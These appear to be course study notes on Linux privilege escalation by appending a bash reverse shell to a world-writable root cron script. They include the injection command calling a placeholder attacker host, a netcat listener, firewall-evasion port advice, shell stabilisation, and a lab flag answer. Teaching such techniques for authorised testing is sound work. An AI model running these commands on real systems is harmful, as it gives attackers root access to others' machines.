# Section 13 — Cron Job Abuse

## ID
531

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 13 — Cron Job Abuse

## Description
Covers privilege escalation by hijacking world-writable scripts executed by root cron jobs, using reverse shell injection to gain a root shell.

## Tags
privesc, cron, cronjob, reverse-shell, misconfiguration, linux

## Commands
- find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
- ls -la /dmz-backups/
- cat /dmz-backups/backup.sh
- echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /dmz-backups/backup.sh
- ./pspy64 -pf -i 1000
- sudo nc -nvlp 443
- crontab -l
- ls -la /etc/cron.d/

## What This Section Covers
Cron jobs run scheduled tasks via the cron daemon. If a script executed by a root cron job is world-writable, any user can append commands to it — including a reverse shell — and those commands will execute as root on the next cron cycle. This is a common misconfiguration in real environments, especially with backup scripts.

## Methodology
1. Hunt for world-writable files with `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` — look for scripts in directories like `/dmz-backups/`, `/opt/`, `/etc/cron.d/`, `/home/*/`.
2. Confirm the script runs on a cron by checking timestamps of output files (`ls -la`) or by using `pspy64 -pf -i 1000` to watch for UID=0 process execution.
3. Inspect the script with `cat` to understand what it does — look for the cron schedule pattern (e.g., `*/3 * * * *` = every 3 minutes).
4. Start a netcat listener on your attack box: `sudo nc -nvlp 443`.
5. **Append** (don't overwrite) a bash reverse shell one-liner to the script: `echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1' >> /path/to/script.sh`.
6. Wait for the cron cycle — receive root shell on the listener.

## Multi-step Workflow (optional)
```
# On attack box — start listener
sudo nc -nvlp 443

# On target — inject reverse shell into writable cron script
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1' >> /dmz-backups/backup.sh

# Wait for cron execution, catch root shell
# On root shell
cat /root/cron_abuse/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Submit contents of flag.txt in /root/cron_abuse | 14347a2c977eb84508d3d50691a7ac4b | Appended reverse shell to /dmz-backups/backup.sh → caught root shell → cat flag |

## Key Takeaways
- Always **append** (`>>`) to cron scripts, never overwrite (`>`) — the original functionality must keep running or the cron job may error out before reaching your payload.
- Use `pspy` to discover cron jobs you can't see in `crontab -l` (since you're not root) — it scans `/proc` to detect processes spawned by other users.
- The cron schedule `*/3 * * * *` (every 3 minutes) vs `0 */3 * * *` (every 3 hours) is a common sysadmin mistake — always look for backup directories with suspiciously frequent timestamps.
- World-writable cron scripts are a recurring finding in real pentests — check `/etc/cron.d/`, `/etc/cron.daily/`, and any custom backup directories.
- Always back up the original script before modifying it in a real engagement, and clean up your reverse shell line after you're done.

## Gotchas
- If the cron job uses a restricted `PATH`, your reverse shell might fail because `bash` isn't found — use the full path `/bin/bash -i >& /dev/tcp/...` if needed.
- Port 443 for the listener is a good choice because outbound HTTPS is rarely blocked by firewalls — lower ports like 4444 might be filtered.
- The reverse shell won't have a proper TTY — stabilize it with `python3 -c 'import pty;pty.spawn("/bin/bash")'` followed by `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm` if you need an interactive session.
